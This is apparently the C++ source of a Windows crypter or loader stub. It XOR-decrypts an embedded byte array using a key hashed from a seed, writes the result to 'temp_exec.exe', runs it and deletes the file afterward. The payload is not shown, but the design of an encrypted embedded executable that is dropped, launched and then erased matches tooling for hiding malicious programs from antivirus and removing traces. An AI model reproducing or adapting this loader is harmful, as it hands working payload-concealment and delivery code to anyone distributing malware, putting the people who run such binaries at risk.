#include <Windows.h>
#include <iostream>
#include <vector>
#include <cstdint>
#include <string>
#include <fstream>
#include "../temp/data.h"
#include "../headers/key.h"

extern const unsigned char DATA[];
extern const unsigned int DATA_LEN;

uint8_t hash_1b(const std::string& seed) {
    uint8_t key = VM_KEY;
    for (size_t i = 0; i < seed.size(); i++) {
        key = ((key ^ seed[i]) * 0x83) ^ (key >> 3);
    }

    return key;
}

// This run code is Derived using common development resources
bool ExecuteAndDeleteFile(const std::string& fileName) {
    // Start the executable
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    if (!CreateProcess(nullptr, const_cast<LPSTR>(fileName.c_str()), nullptr, nullptr, FALSE, 0, nullptr, nullptr, &si, &pi)) {
        std::cerr << "CreateProcess failed with error " << GetLastError() << std::endl;
        return false;
    }

    // Wait for the process to finish
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Close process and thread handles
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    // Now delete the file after the process has finished
    if (!DeleteFile(fileName.c_str())) {
        std::cerr << "Failed to delete temporary file. Error: " << GetLastError() << std::endl;
        return false;
    }

    return true;
}

int main() {
    // Initialize data_copy with the correct size
    std::vector<unsigned char> data_copy(DATA_LEN);

    uint8_t k = hash_1b(KEY);

    for (size_t i = 0; i < DATA_LEN; i++) {
        data_copy[i] = static_cast<unsigned char>(DATA[i] ^ k); // Ensure to use unsigned char
    }


    std::string tempFileName = "temp_exec.exe";

    // Write the decrypted data to a temporary file
    std::ofstream tempFile(tempFileName, std::ios::binary);
    if (!tempFile) {
        std::cerr << "Failed to create temporary file." << std::endl;
        return 1;
    }
    tempFile.write(reinterpret_cast<const char*>(data_copy.data()), data_copy.size());
    tempFile.close();

    // Execute and delete the temporary file
    ExecuteAndDeleteFile(tempFileName);

    return 0;
}
